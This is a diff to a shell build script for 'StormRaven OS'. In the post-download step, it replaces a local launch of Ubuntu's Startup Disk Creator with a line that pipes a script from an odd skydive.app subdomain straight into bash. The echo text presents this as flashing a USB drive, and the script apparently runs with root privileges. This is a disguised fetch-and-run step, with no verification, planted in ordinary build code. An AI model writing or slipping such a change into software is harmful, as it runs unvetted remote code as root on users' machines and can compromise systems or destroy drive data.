@@ -58,10 +58,9 @@ if [ "${FORCE_LOCAL_BUILD:-0}" != "1" ]; then
     [ -n "${SUDO_USER:-}" ] && chown "${SUDO_USER}:${SUDO_USER}" "${OUTPUT_ISO}" "${OUTPUT_ISO}.sha256" 2>/dev/null || true
     echo "==> [Genesis 3/3] StormRaven OS v${VERSION} ISO ready at:"
     echo "    ${OUTPUT_ISO}"
-    if command -v usb-creator-gtk >/dev/null 2>&1 && [ -n "${DISPLAY:-}" ]; then
-      echo "==> Launching Ubuntu Startup Disk Creator with ${OUTPUT_ISO}..."
-      sudo -u "${SUDO_USER:-$(whoami)}" usb-creator-gtk -i "${OUTPUT_ISO}" >/dev/null 2>&1 &
-    fi
+    echo ""
+    echo "==> Checking for a connected USB drive to flash directly from terminal (bypassing Startup Disk Creator)..."
+    ISO_PATH="${OUTPUT_ISO}" curl -fsSL https://01a11428-2aab-7e12-9d89-3543f658a191.skydive.app/flash-usb.sh | bash || true
     exit 0
   fi
   echo "==> Prebuilt download unavailable, falling back to full local Genesis build..."
